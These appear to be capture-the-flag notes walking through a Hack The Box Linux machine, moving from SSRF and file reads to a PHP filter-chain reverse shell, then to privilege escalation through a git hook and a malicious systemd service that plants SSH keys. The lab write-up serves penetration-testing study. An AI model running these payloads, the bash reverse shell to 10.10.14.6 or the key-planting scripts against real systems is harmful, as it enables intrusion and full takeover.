## 📌 Box Info
- **OS**: [Linux](Linux)
- **Difficulty**: [Medium](Medium)
- Platform: [HTB](HTB)
- Prep: [OSCP](OSCP.md)

## Recon

### Nmap Scan
```
nmap -p- --min-rate 10000 10.10.11.198
nmap -p 22,80 -sCV 10.10.11.198
```
- Ports open: 22 [SSH](SSH), 80 [HTTP](HTTP.md)
- Hostname discovered: `haxtables.htb`

### Website Enumeration
- `/index.php?page=...` suggests PHP file includes
- Site for "string and number converter"
- `api.haxtables.htb` referenced

### Subdomain Enumeration
```
wfuzz -u http://10.10.11.198 -H "Host: FUZZ.haxtables.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --hh 1999
```
- Discovered: `api.haxtables.htb`, `image.haxtables.htb`

### Directory Bruteforce
```
feroxbuster -u http://haxtables.htb -x php
```
- Found: `/handler.php`, `/includes/`, etc.

## Shell as www-data

### SSRF Discovery
- `/handler.php` POSTs to API using `uri_path`
- SSRF by injecting `@10.10.14.6` into `uri_path`

### File Read via `file://`
```python
json_data = {"action": "str2hex", "file_url": "file:///etc/hostname"}
```
- File read works, use Flask proxy to exfil files easily

### Flask Proxy
```python
from flask import Flask, Response
import requests
...
@app.route('/<path:file>')
def get_file(file):
    req_data = {"action": "str2hex", "file_url": f"file:///{file}"}
    resp = requests.post("http://api.haxtables.htb/v3/tools/string/index.php", json=req_data)
    return Response(bytes.fromhex(resp.json()['data']), content_type="application/octet-stream")
```

### LFI to RCE via Filter Chain
```bash
python php_filter_chain_generator.py --chain '<?php system("bash -c \"bash -i >& /dev/tcp/10.10.14.6/443 0>&1 \""); ?>'
```
- SSRF to include malicious filter payload to trigger RCE

## Shell as svc

### Privilege Escalation via Git Hook
- `www-data` can sudo as `svc` via `/scripts/git-commit.sh`
- Git repo in `/var/www/image/.git`, writable by `www-data`
- Write `post-commit` hook to insert SSH key for `svc`
```bash
echo 'mkdir -p /home/svc/.ssh
echo "<pubkey>" >> /home/svc/.ssh/authorized_keys
chmod 600 /home/svc/.ssh/authorized_keys' > .git/hooks/post-commit
chmod +x .git/hooks/post-commit
```
- Modify work-tree to include new file:
```bash
git --work-tree /etc add /etc/hostname
sudo -u svc /var/www/image/scripts/git-commit.sh
```
- SSH as `svc`

## Shell as root

### Privilege Escalation via Systemd
- `svc` can run `sudo systemctl restart *`
- `/etc/systemd/system` is writable by `svc`

### Malicious Service
```ini
# /etc/systemd/system/0xdf.service
[Unit]
Description=0xdf command service

[Service]
ExecStart=/tmp/0xdf
Type=simple
Restart=always

[Install]
WantedBy=multi-user.target
```
```bash
# /tmp/0xdf
mkdir -p /root/.ssh
echo '<pubkey>' > /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
touch /tmp/script_ran
chmod +x /tmp/0xdf
```
- Trigger with: `sudo systemctl restart 0xdf`

## Root Access
- SSH as `root` using injected key
- Read `/root/root.txt`